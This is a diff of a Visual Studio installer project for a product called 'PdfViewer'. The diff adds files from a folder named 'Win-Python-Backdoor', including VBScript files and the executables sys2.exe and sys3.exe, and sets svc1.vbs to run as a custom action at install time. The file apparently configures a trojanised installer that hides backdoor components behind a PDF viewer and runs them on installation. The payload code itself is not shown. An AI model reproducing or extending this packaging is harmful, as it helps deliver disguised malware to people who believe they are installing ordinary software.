@@ -33,7 +33,19 @@
         }
         "Entry"
         {
+        "MsmKey" = "8:_32326F9B01584275935F5721BDC128E5"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
         "MsmKey" = "8:_38A2E542622A45C0B5F20CA993E8F2B5"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
+        "MsmKey" = "8:_5123D73D7D0C4A45816C56F2053DB79B"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
@@ -57,6 +69,12 @@
         }
         "Entry"
         {
+        "MsmKey" = "8:_8376A9535D994A51B4C6F4E0332EC90F"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
         "MsmKey" = "8:_83A8D650AF654ED1BCE57A1A31342EAD"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
@@ -69,13 +87,13 @@
         }
         "Entry"
         {
-        "MsmKey" = "8:_FA1D03CCC97B41A3B09C011C0BABBFB0"
+        "MsmKey" = "8:_B2F2BC47D3D544F882E859D44C960519"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
         "Entry"
         {
-        "MsmKey" = "8:_FF2780F151BD436D8D5D784DC361DED5"
+        "MsmKey" = "8:_FA1D03CCC97B41A3B09C011C0BABBFB0"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
@@ -151,17 +169,17 @@
     {
         "CustomAction"
         {
-            "{4AA51A2D-7D85-4A59-BA75-B0809FC8B380}:_F5370608AEA441E8A9B4EA3498AF69A6"
+            "{4AA51A2D-7D85-4A59-BA75-B0809FC8B380}:_B4D1DD22F33A44D38EB8320D0949E4B4"
             {
-            "Name" = "8:svc.vbs"
+            "Name" = "8:svc1.vbs"
             "Condition" = "8:"
-            "Object" = "8:_FF2780F151BD436D8D5D784DC361DED5"
+            "Object" = "8:_8376A9535D994A51B4C6F4E0332EC90F"
             "FileType" = "3:4"
             "InstallAction" = "3:1"
             "Arguments" = "8:"
             "EntryPoint" = "8:"
             "Sequence" = "3:1"
-            "Identifier" = "8:_1B014E1E_CD62_4187_A9CC_9DEB5E0DAF11"
+            "Identifier" = "8:_6E37C6AD_3A50_4CD6_B5F7_B289EC3FCEDC"
             "InstallerClass" = "11:FALSE"
             "CustomActionData" = "8:"
             }
@@ -240,10 +258,50 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_32326F9B01584275935F5721BDC128E5"
+            {
+            "SourcePath" = "8:..\\..\\C++\\Release\\sys3.exe"
+            "TargetName" = "8:sys3.exe"
+            "Tag" = "8:"
+            "Folder" = "8:_A4A286D4624E4C09A4C2E55D48F6201A"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:FALSE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_38A2E542622A45C0B5F20CA993E8F2B5"
             {
             "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\office_get.xml"
             "TargetName" = "8:office_get.xml"
+            "Tag" = "8:"
+            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:FALSE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_5123D73D7D0C4A45816C56F2053DB79B"
+            {
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\svc.vbs"
+            "TargetName" = "8:svc.vbs"
             "Tag" = "8:"
             "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
             "Condition" = "8:"
@@ -320,6 +378,26 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_8376A9535D994A51B4C6F4E0332EC90F"
+            {
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\svc1.vbs"
+            "TargetName" = "8:svc1.vbs"
+            "Tag" = "8:"
+            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:FALSE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_83A8D650AF654ED1BCE57A1A31342EAD"
             {
             "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\libssl-1_1.dll"
@@ -360,12 +438,12 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_FA1D03CCC97B41A3B09C011C0BABBFB0"
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_B2F2BC47D3D544F882E859D44C960519"
             {
-            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\unin.vbs"
-            "TargetName" = "8:unin.vbs"
+            "SourcePath" = "8:..\\..\\C++\\Release\\sys2.exe"
+            "TargetName" = "8:sys2.exe"
             "Tag" = "8:"
-            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
+            "Folder" = "8:_A4A286D4624E4C09A4C2E55D48F6201A"
             "Condition" = "8:"
             "Transitive" = "11:FALSE"
             "Vital" = "11:TRUE"
@@ -380,10 +458,10 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_FF2780F151BD436D8D5D784DC361DED5"
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_FA1D03CCC97B41A3B09C011C0BABBFB0"
             {
-            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\svc.vbs"
-            "TargetName" = "8:svc.vbs"
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\unin.vbs"
+            "TargetName" = "8:unin.vbs"
             "Tag" = "8:"
             "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
             "Condition" = "8:"
@@ -480,7 +558,7 @@
         "Name" = "8:Microsoft Visual Studio"
         "ProductName" = "8:PdfViewer"
         "ProductCode" = "8:{98F8450D-4A66-4E18-8FCE-08606DE0F6C6}"
-        "PackageCode" = "8:{01E913A4-8379-4EEF-93BB-0A936BAAB477}"
+        "PackageCode" = "8:{CF1A12C8-A9B5-4716-B519-765CA785DBED}"
         "UpgradeCode" = "8:{C3C953E8-4B5D-4005-9499-3D2A2CF54F8C}"
         "AspNetVersion" = "8:4.0.30319.0"
         "RestartWWWService" = "11:FALSE"
